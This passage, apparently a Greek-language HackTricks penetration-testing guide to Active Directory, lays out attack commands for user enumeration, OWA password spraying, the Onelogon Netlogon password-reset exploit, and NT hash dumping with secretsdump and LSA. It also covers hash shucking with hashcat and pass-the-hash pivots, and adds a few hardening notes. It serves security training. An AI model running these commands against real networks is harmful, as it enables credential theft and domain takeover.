# Μεθοδολογία Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

Το **Active Directory** αποτελεί θεμελιώδη τεχνολογία που επιτρέπει στους **διαχειριστές δικτύων** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **users** και **objects** σε ένα δίκτυο. Έχει σχεδιαστεί ώστε να κλιμακώνεται, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμες **groups** και **subgroups**, ενώ παράλληλα ελέγχει τα **δικαιώματα πρόσβασης** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία κύρια επίπεδα: **domains**, **trees** και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή αντικειμένων, όπως **users** ή **devices**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι ομάδες αυτών των domains, συνδεδεμένες μέσω κοινής δομής, ενώ ένα **forest** είναι μια συλλογή πολλών trees, διασυνδεδεμένων μέσω **trust relationships**, και αποτελεί το ανώτατο επίπεδο της οργανωτικής δομής. Σε καθένα από αυτά τα επίπεδα μπορούν να οριστούν συγκεκριμένα **δικαιώματα πρόσβασης** και **επικοινωνίας**.

Βασικές έννοιες του **Active Directory**:

1. **Directory** – Περιέχει όλες τις πληροφορίες που αφορούν τα αντικείμενα του Active Directory.
2. **Object** – Αντιπροσωπεύει οντότητες μέσα στον κατάλογο, όπως **users**, **groups** ή **shared folders**.
3. **Domain** – Λειτουργεί ως δοχείο για τα αντικείμενα του καταλόγου. Σε ένα **forest** μπορούν να συνυπάρχουν πολλά domains, καθένα με τη δική του συλλογή αντικειμένων.
4. **Tree** – Ομάδα domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Το ανώτατο επίπεδο της οργανωτικής δομής στο Active Directory, αποτελούμενο από πολλά trees με **trust relationships** μεταξύ τους.

Το **Active Directory Domain Services (AD DS)** περιλαμβάνει ένα σύνολο υπηρεσιών κρίσιμων για την κεντρική διαχείριση και την επικοινωνία μέσα σε ένα δίκτυο. Σε αυτές περιλαμβάνονται:

1. **Domain Services** – Συγκεντρώνει την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **users** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Διαχειρίζεται τη δημιουργία, τη διανομή και τη διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει εφαρμογές με δυνατότητα χρήσης καταλόγου μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την αυθεντικοποίηση χρηστών σε πολλές web εφαρμογές κατά τη διάρκεια μίας συνεδρίας.
5. **Rights Management** – Συμβάλλει στην προστασία υλικού που καλύπτεται από πνευματικά δικαιώματα, περιορίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Απαραίτητη για την επίλυση **domain names**.

Για πιο αναλυτική εξήγηση, δείτε: [**TechTerms - Ορισμός του Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να **επιτεθείτε σε ένα AD**, πρέπει να **κατανοήσετε** πολύ καλά τη **διαδικασία Kerberos authentication**.\
[**Διαβάστε αυτή τη σελίδα αν δεν γνωρίζετε ακόμη πώς λειτουργεί.**](kerberos-authentication.md)

## Σύντομος οδηγός

Μπορείτε να επισκεφτείτε το [https://wadcoms.github.io/](https://wadcoms.github.io) για μια γρήγορη επισκόπηση των εντολών που μπορείτε να εκτελέσετε για να κάνετε enumerate/exploit ένα AD.

> [!WARNING]
> Η επικοινωνία Kerberos **απαιτεί συνήθως ένα πλήρως προσδιορισμένο όνομα domain (FQDN)**, ώστε ο client να μπορεί να λάβει ticket για το σωστό SPN. Η πρόσβαση σε ένα μηχάνημα μέσω διεύθυνσης IP συνήθως οδηγεί σε εναλλακτική χρήση NTLM αντί για Kerberos.

## Recon Active Directory (χωρίς creds/sessions)

Αν έχετε πρόσβαση σε ένα περιβάλλον AD αλλά δεν έχετε credentials/sessions, μπορείτε να:

- **Κάνετε pentest στο δίκτυο:**
  - Σαρώστε το δίκτυο, εντοπίστε μηχανήματα και ανοιχτές θύρες και προσπαθήστε να **εκμεταλλευτείτε vulnerabilities** ή να **εξαγάγετε credentials** από αυτά (για παράδειγμα, [οι εκτυπωτές μπορεί να είναι πολύ ενδιαφέροντες στόχοι](ad-information-in-printers.md)).
  - Το enumeration του DNS μπορεί να αποκαλύψει πληροφορίες για σημαντικούς servers στο domain, όπως web, printers, shares, vpn, media κ.λπ.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Δείτε τη γενική [**Μεθοδολογία Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε.
- **Ελέγξτε για null και Guest access σε υπηρεσίες smb** (αυτό δεν θα λειτουργήσει σε σύγχρονες εκδόσεις Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Μπορείτε να βρείτε έναν πιο αναλυτικό οδηγό για το enumeration ενός SMB server εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Κάντε enumeration του Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Μπορείτε να βρείτε έναν πιο αναλυτικό οδηγό για το enumeration του LDAP εδώ (δώστε **ιδιαίτερη προσοχή στην anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Δηλητηριάστε το δίκτυο**
  - Συλλέξτε credentials [**προσποιούμενοι υπηρεσίες με το Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Αποκτήστε πρόσβαση σε host [**κάνοντας κατάχρηση της relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Συλλέξτε credentials **εκθέτοντας** [**ψεύτικες υπηρεσίες UPnP με το evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Εξαγάγετε usernames/ονόματα από εσωτερικά έγγραφα, social media, υπηρεσίες (κυρίως web) στα περιβάλλοντα domain, καθώς και από δημόσια διαθέσιμες πηγές.
  - Αν βρείτε τα πλήρη ονόματα εργαζομένων της εταιρείας, μπορείτε να δοκιμάσετε διαφορετικές συμβάσεις ονοματοδοσίας **username του AD (**[**διαβάστε αυτό**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο συνηθισμένες συμβάσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _τυχαία γράμματα και 3 τυχαίοι αριθμοί_ (abc123).
  - Εργαλεία:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeration χρηστών

- **Anonymous SMB/LDAP enum:** Δείτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητείται ένα **μη έγκυρο username**, ο server απαντά με τον κωδικό σφάλματος **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να διαπιστώσουμε ότι το username δεν είναι έγκυρο. Για τα **έγκυρα usernames**, θα επιστραφεί είτε το **TGT σε απόκριση AS-REP** είτε το σφάλμα _KRB5KDC_ERR_PREAUTH_REQUIRED_, το οποίο υποδεικνύει ότι ο χρήστης πρέπει να πραγματοποιήσει pre-authentication.
- **No Authentication έναντι του MS-NRPC**: Χρήση auth-level = 1 (No authentication) έναντι της διεπαφής MS-NRPC (Netlogon) στους domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` μετά τη σύνδεση στη διεπαφή MS-NRPC, για να ελέγξει αν υπάρχει ο χρήστης ή ο υπολογιστής χωρίς credentials. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. Η έρευνα είναι διαθέσιμη [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **Διακομιστής OWA (Outlook Web Access)**

Αν εντοπίσατε έναν από αυτούς τους διακομιστές στο δίκτυο, μπορείτε επίσης να πραγματοποιήσετε **user enumeration εναντίον του**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Μπορείτε να βρείτε λίστες με ονόματα χρηστών σε [**αυτό το github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) και σε αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε τα **ονόματα των ατόμων που εργάζονται στην εταιρεία** από το βήμα του recon που θα έπρεπε να έχετε πραγματοποιήσει νωρίτερα. Με το όνομα και το επώνυμο, θα μπορούσατε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανά έγκυρα ονόματα χρηστών.

### Κατάχρηση allow-list ευάλωτου καναλιού Netlogon (Onelogon)

Ακόμα και αφού γίνει patch στο **Zerologon** στον DC, οι λογαριασμοί που περιλαμβάνονται ρητά σε allow-list μπορεί να παραμένουν εκτεθειμένοι σε **παλαιότερη/ευάλωτη συμπεριφορά ασφαλούς καναλιού Netlogon**. Η επικίνδυνη ρύθμιση είναι το GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ή η αντίστοιχη τιμή μητρώου **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Αυτή η τιμή είναι ένας **περιγραφέας ασφαλείας SDDL** (δείτε το [Security Descriptors](security-descriptors.md)). Κάθε λογαριασμός ή ομάδα που έχει το σχετικό ACE στο DACL μπορεί να αποτελέσει στόχο. Για παράδειγμα, το `O:BAG:BAD:(A;;RC;;;WD)` περιλαμβάνει ουσιαστικά το **Everyone** στην allow-list.

Πρακτική ροή εργασίας για operator:

1. **Εντοπίστε τις principals της allow-list** ελέγχοντας τόσο το **SYSVOL/GPO** όσο και το **live registry του DC**.
2. **Αντιστοιχίστε τα SIDs** που βρίσκονται στο SDDL με πραγματικούς χρήστες/υπολογιστές AD και δώστε προτεραιότητα σε **λογαριασμούς μηχανημάτων DC**, **λογαριασμούς trust** και άλλα προνομιούχα μηχανήματα.
3. Επιχειρήστε επανειλημμένα **MS-NRPC / Netlogon authentication** ως ο λογαριασμός της allow-list.
4. Μετά από επιτυχημένη εικασία, καταχραστείτε τη λειτουργία **Netlogon password-setting** για να επαναφέρετε τον κωδικό πρόσβασης του λογαριασμού-στόχου (το δημόσιο PoC τον ορίζει ως κενή συμβολοσειρά).<sup>[[9]](#references)[[10]](#references)</sup>

Γρήγορη αρχική διαλογή / παραδείγματα lab από το δημόσιο artifact:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Σημειώσεις:

- Ο **scanner** είναι χρήσιμος επειδή η αποτελεσματική allow-list μπορεί να βρίσκεται στο **SYSVOL**, στο **registry** ή και στα δύο.
- Η ίδια η διαδρομή εκμετάλλευσης είναι σημαντική, επειδή **δεν απαιτεί προνόμια Domain Admin** από τη στιγμή που εντοπιστεί ένας ευάλωτος λογαριασμός.
- Η παραβίαση ενός **λογαριασμού υπολογιστή Domain Controller**, όπως ο `DC$`, είναι ιδιαίτερα επικίνδυνη, επειδή η επαναφορά του κωδικού πρόσβασης μπορεί να ενεργοποιήσει άμεσα ευρύτερες διαδρομές για **AD takeover**.
- Η δυνατότητα **brute-force** εξαρτάται από τη λειτουργία: το δημόσιο artifact περιγράφει μια προσέγγιση meet-in-the-middle, brute force **24 bit** όταν υπάρχει διαθέσιμος άλλος λογαριασμός υπολογιστή, καθώς και πιο αργές παραλλαγές **32 bit**.

Σημειώσεις για εντοπισμό / hardening:

- Ελέγξτε την πολιτική allow-list και αφαιρέστε οτιδήποτε πέρα από προσωρινές, ρητά απαιτούμενες εξαιρέσεις συμβατότητας.
- Παρακολουθείτε τα συμβάντα **System** του DC **5827/5828/5829/5830/5831**, για να εντοπίζετε ευάλωτες συνδέσεις Netlogon που απορρίπτονται, εντοπίζονται ή επιτρέπονται ρητά από την πολιτική.
- Αντιμετωπίζετε τους λογαριασμούς στο `VulnerableChannelAllowList` ως **υψηλού κινδύνου** μέχρι να καταργηθεί η εξάρτηση από το legacy σύστημα.

### Γνωρίζοντας ένα ή περισσότερα usernames

Ωραία, γνωρίζετε ήδη ένα έγκυρο username, αλλά δεν έχετε κωδικούς πρόσβασης... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Αν ένας χρήστης **δεν έχει** το attribute _DONT_REQ_PREAUTH_, μπορείτε να **ζητήσετε ένα μήνυμα AS_REP** για αυτόν τον χρήστη, το οποίο θα περιέχει δεδομένα κρυπτογραφημένα με ένα παράγωγο του κωδικού πρόσβασης του χρήστη.
- [**Password Spraying**](password-spraying.md): Ας δοκιμάσουμε τους πιο **συνηθισμένους κωδικούς πρόσβασης** για κάθε χρήστη που εντοπίστηκε· ίσως κάποιος χρήστης να χρησιμοποιεί έναν αδύναμο κωδικό πρόσβασης (μην ξεχνάτε την πολιτική κωδικών πρόσβασης!).
  - Σημειώστε ότι μπορείτε επίσης να κάνετε **spray σε OWA servers**, για να προσπαθήσετε να αποκτήσετε πρόσβαση στους mail servers των χρηστών.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ίσως μπορέσετε να **αποκτήσετε** κάποια challenge **hashes** κάνοντας **poisoning** σε ορισμένα πρωτόκολλα του **δικτύου**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Η απαρίθμηση του Active Directory παρέχει usernames, αναγνωριστικά email και μοτίβα ονοματοδοσίας, πιθανούς hosts και υπηρεσίες που μπορεί να εξαναγκαστούν να πραγματοποιήσουν authentication. Χρησιμοποιήστε αυτά τα στοιχεία για να εντοπίσετε βιώσιμες [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM και πιθανά μονοπάτια προς το περιβάλλον AD.

### Αναγνώριση και έλεγχοι στάσης relay με βάση τα NetExec workspaces

- Χρησιμοποιήστε τα **workspaces του `nxcdb`** για να διατηρείτε την κατάσταση αναγνώρισης AD ξεχωριστά για κάθε engagement: το `workspace create <name>` δημιουργεί SQLite DB ανά πρωτόκολλο στο `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Αλλάξτε προβολή με `proto smb|mssql|winrm` και εμφανίστε τα συγκεντρωμένα secrets με `creds`. Διαγράψτε χειροκίνητα τα ευαίσθητα δεδομένα όταν τελειώσετε: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Η γρήγορη ανακάλυψη subnet με **`netexec smb <cidr>`** εμφανίζει το **domain**, το **OS build**, τις **απαιτήσεις SMB signing** και το **Null Auth**. Τα μέλη που εμφανίζουν `(signing:False)` είναι **ευάλωτα σε relay**, ενώ οι DC συνήθως απαιτούν signing.
- Δημιουργήστε **hostnames στο /etc/hosts** απευθείας από την έξοδο του NetExec για ευκολότερη στόχευση:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Όταν το **SMB relay προς τον DC αποκλείεται** λόγω signing, ελέγξτε και τη στάση του **LDAP**: το `netexec ldap <dc>` επισημαίνει `(signing:None)` / αδύναμο channel binding. Ένας DC με υποχρεωτικό SMB signing αλλά απενεργοποιημένο LDAP signing παραμένει βιώσιμος στόχος **relay-to-LDAP** για επιθέσεις όπως το **SPN-less RBCD**.

### Διαρροές διαπιστευτηρίων από εκτυπωτές client-side → μαζική επικύρωση διαπιστευτηρίων domain

- Τα web UI εκτυπωτών μερικές φορές **ενσωματώνουν κρυμμένους κωδικούς πρόσβασης διαχειριστή σε HTML**. Η προβολή του πηγαίου κώδικα ή των devtools μπορεί να αποκαλύψει το κείμενο σε μορφή cleartext (π.χ. `<input value="<password>">`), επιτρέποντας πρόσβαση με Basic-auth σε αποθετήρια σάρωσης/εκτύπωσης.
- Οι εργασίες εκτύπωσης που ανακτώνται μπορεί να περιέχουν **έγγραφα αρχικής εγκατάστασης σε plaintext** με κωδικούς πρόσβασης ανά χρήστη. Διατηρήστε τα ζεύγη αντιστοιχισμένα κατά τις δοκιμές:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Κλοπή NTLM διαπιστευτηρίων

Αν μπορείς να **αποκτήσεις πρόσβαση σε άλλους υπολογιστές ή shares** με τον **null ή guest χρήστη**, μπορείς να **τοποθετήσεις αρχεία** (όπως ένα αρχείο SCF), τα οποία, αν προσπελαστούν με κάποιον τρόπο, θα **προκαλέσουν αυθεντικοποίηση NTLM εναντίον σου**, ώστε να **κλέψεις** το **NTLM challenge** και να το σπάσεις:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Το **Hash shucking** αντιμετωπίζει κάθε NT hash που έχεις ήδη στην κατοχή σου ως υποψήφιο κωδικό πρόσβασης για άλλες, πιο αργές μορφές, των οποίων το υλικό κλειδιού παράγεται απευθείας από το NT hash. Αντί να κάνεις brute-force σε μεγάλες φράσεις πρόσβασης μέσα σε Kerberos RC4 tickets, NetNTLM challenges ή αποθηκευμένα διαπιστευτήρια, δίνεις τα NT hashes στις λειτουργίες NT-candidate του Hashcat και το αφήνεις να επαληθεύσει την επαναχρησιμοποίηση κωδικών πρόσβασης χωρίς να χρειαστεί να ανακτήσεις ποτέ το plaintext. Αυτή η τεχνική είναι ιδιαίτερα αποτελεσματική μετά από παραβίαση domain, όπου μπορείς να συλλέξεις χιλιάδες τρέχοντα και ιστορικά NT hashes.<sup>[[5]](#references)</sup>

Χρησιμοποίησε το shucking όταν:

- Έχεις ένα NT corpus από DCSync, dumps SAM/SECURITY ή credential vaults και χρειάζεται να ελέγξεις αν υπάρχουν επαναχρησιμοποιημένοι κωδικοί σε άλλα domains/forests.
- Συλλαμβάνεις υλικό Kerberos βασισμένο σε RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), απαντήσεις NetNTLM ή blobs DCC/DCC2.
- Θέλεις να αποδείξεις γρήγορα την επαναχρησιμοποίηση μεγάλων, μη σπάσιμων φράσεων πρόσβασης και να κάνεις αμέσως pivot μέσω Pass-the-Hash.

Η τεχνική **δεν λειτουργεί** απέναντι σε τύπους κρυπτογράφησης των οποίων τα κλειδιά δεν είναι το NT hash (π.χ. Kerberos etype 17/18 AES). Αν ένα domain επιβάλλει αποκλειστικά AES, πρέπει να επιστρέψεις στις κανονικές λειτουργίες κωδικών πρόσβασης.

#### Δημιουργία NT hash corpus

- **DCSync/NTDS** – Χρησιμοποίησε το `secretsdump.py` μαζί με το history, για να συλλέξεις το μεγαλύτερο δυνατό σύνολο NT hashes (και τις προηγούμενες τιμές τους):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Οι εγγραφές ιστορικού διευρύνουν σημαντικά το σύνολο υποψηφίων, επειδή η Microsoft μπορεί να αποθηκεύσει έως και 24 προηγούμενα hashes ανά λογαριασμό. Για περισσότερους τρόπους συλλογής NTDS secrets, δείτε:

{{#ref}}
dcsync.md
{{#endref}}

- **Απορρίψεις cache endpoint** – Η εντολή `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ή το Mimikatz `lsadump::sam /patch`) εξάγει τοπικά δεδομένα SAM/SECURITY και αποθηκευμένα στη cache domain logons (DCC/DCC2). Αφαιρέστε τα διπλότυπα και προσθέστε αυτά τα hashes στην ίδια λίστα `nt_candidates.txt`.
- **Παρακολούθηση metadata** – Διατηρήστε το username/domain που παρήγαγε κάθε hash (ακόμα κι αν η wordlist περιέχει μόνο hex). Όταν το Hashcat εμφανίσει τον υποψήφιο που πέτυχε, τα hashes που ταιριάζουν σάς δείχνουν αμέσως ποιο principal επαναχρησιμοποιεί password.
- Προτιμήστε υποψηφίους από το ίδιο forest ή από ένα trusted forest· έτσι μεγιστοποιείται η πιθανότητα επικάλυψης κατά το shucking.

#### Modes NT-candidate του Hashcat

| Τύπος hash                              | Mode password | Mode NT-candidate |
| --------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)         | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)      | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS               | 5500          | 27000             |
| NetNTLMv2                               | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth     | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100        | 35300             |
| Kerberos 5 etype 23 AS-REP              | 18200         | 35400             |

Σημειώσεις:

- Οι είσοδοι NT-candidate **πρέπει να παραμείνουν ακατέργαστα NT hashes 32 χαρακτήρων hex**. Απενεργοποιήστε τα rule engines (χωρίς `-r` και χωρίς hybrid modes), επειδή οι μετασχηματισμοί αλλοιώνουν το υλικό κλειδιού των υποψηφίων.
- Αυτά τα modes δεν είναι εγγενώς ταχύτερα, αλλά το keyspace του NTLM (~30.000 MH/s σε M3 Max) είναι ~100× ταχύτερο από το Kerberos RC4 (~300 MH/s). Η δοκιμή μιας επιμελημένης λίστας NT κοστίζει πολύ λιγότερο από την εξερεύνηση ολόκληρου του password space στην αργή μορφή.
- Χρησιμοποιείτε πάντα την **τελευταία έκδοση του Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), καθώς τα modes 31500/31600/35300/35400 κυκλοφόρησαν πρόσφατα.<sup>[[7]](#references)</sup>
- Προς το παρόν δεν υπάρχει NT mode για AS-REQ Pre-Auth, ενώ τα AES etypes (19600/19700) απαιτούν το plaintext password, επειδή τα κλειδιά τους παράγονται μέσω PBKDF2 από passwords σε UTF-16LE και όχι από ακατέργαστα NT hashes.

#### Παράδειγμα – Kerberoast RC4 (mode 35300)

1. Συλλέξτε ένα RC4 TGS για ένα SPN-στόχο χρησιμοποιώντας έναν χρήστη με χαμηλά προνόμια (για λεπτομέρειες, δείτε τη σελίδα Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Κάνε shuck το ticket χρησιμοποιώντας τη λίστα NT σου:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Το Hashcat παράγει το κλειδί RC4 από κάθε υποψήφιο NT και επικυρώνει το blob `$krb5tgs$23$...`. Ένα ταίριασμα επιβεβαιώνει ότι ο λογαριασμός υπηρεσίας χρησιμοποιεί ένα από τα υπάρχοντα NT hashes σας.

3. Κάντε αμέσως pivot μέσω PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Μπορείτε προαιρετικά να ανακτήσετε αργότερα το plaintext με `hashcat -m 1000 <matched_hash> wordlists/`, αν χρειαστεί.

#### Παράδειγμα – Cached credentials (mode 31600)

1. Κάντε dump των cached logons από έναν compromised workstation:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Αντιγράψτε τη γραμμή DCC2 για τον ενδιαφέροντα χρήστη του domain στο `dcc2_highpriv.txt` και κάντε shuck:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Μια επιτυχής αντιστοιχία αποδίδει το NT hash που είναι ήδη γνωστό στη λίστα σου, αποδεικνύοντας ότι ο cached χρήστης επαναχρησιμοποιεί έναν κωδικό πρόσβασης. Χρησιμοποίησέ το απευθείας για PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ή κάνε brute-force σε fast NTLM mode για να ανακτήσεις τη συμβολοσειρά.

Η ίδια ακριβώς διαδικασία ισχύει για τα NetNTLM challenge-responses (`-m 27000/27100`) και το DCC (`-m 31500`). Μόλις εντοπιστεί μια αντιστοιχία, μπορείς να ξεκινήσεις relay, SMB/WMI/WinRM PtH ή να κάνεις ξανά crack το NT hash offline με masks/rules.



## Απαρίθμηση του Active Directory ΜΕ credentials/session

Για αυτή τη φάση πρέπει να έχεις **παραβιάσει τα credentials ή ένα session ενός έγκυρου domain account.** Αν έχεις κάποια έγκυρα credentials ή ένα shell ως domain user, **να θυμάσαι ότι οι επιλογές που αναφέρθηκαν προηγουμένως εξακολουθούν να είναι διαθέσιμες για να παραβιάσεις άλλους χρήστες**.

Πριν ξεκινήσεις authenticated enumeration, κατανόησε το **πρόβλημα Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Απαρίθμηση

Η παραβίαση ενός account είναι **σημαντικό βήμα για την αξιολόγηση του domain**, επειδή επιτρέπει authenticated **Active Directory enumeration**:

Όσον αφορά το [**ASREPRoast**](asreproast.md), τώρα μπορείς να εντοπίσεις όλους τους δυνητικά ευάλωτους χρήστες. Όσον αφορά το [**Password Spraying**](password-spraying.md), μπορείς να λάβεις **λίστα με όλα τα usernames** και να δοκιμάσεις τον κωδικό πρόσβασης του παραβιασμένου account, κενούς κωδικούς πρόσβασης και νέους υποσχόμενους κωδικούς.

- Μπορείς να χρησιμοποιήσεις το [**CMD για βασικό recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείς επίσης να χρησιμοποιήσεις το [**powershell για recon**](../basic-powershell-for-pentesters/index.html), που είναι πιο stealthy
- Μπορείς επίσης να [**χρησιμοποιήσεις το powerview**](../basic-powershell-for-pentesters/powerview.md) για να εξαγάγεις πιο λεπτομερείς πληροφορίες
- Ένα ακόμη εξαιρετικό εργαλείο για recon σε ένα active directory είναι το [**BloodHound**](bloodhound.md). **Δεν είναι ιδιαίτερα stealthy** (ανάλογα με τις μεθόδους συλλογής που χρησιμοποιείς), αλλά **αν δεν σε απασχολεί αυτό**, αξίζει οπωσδήποτε να το δοκιμάσεις. Βρες πού μπορούν οι χρήστες να συνδεθούν μέσω RDP, εντόπισε διαδρομές προς άλλες ομάδες κ.λπ.
  - **Άλλα αυτοματοποιημένα εργαλεία AD enumeration είναι τα:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Έλεγξε τις [**εγγραφές DNS του AD**](ad-dns-records.md), καθώς μπορεί να περιέχουν ενδιαφέρουσες πληροφορίες.
- Ένα **εργαλείο με GUI** που μπορείς να χρησιμοποιήσεις για την απαρίθμηση του directory είναι το **AdExplorer.exe** από τη σουίτα **SysInternal**.
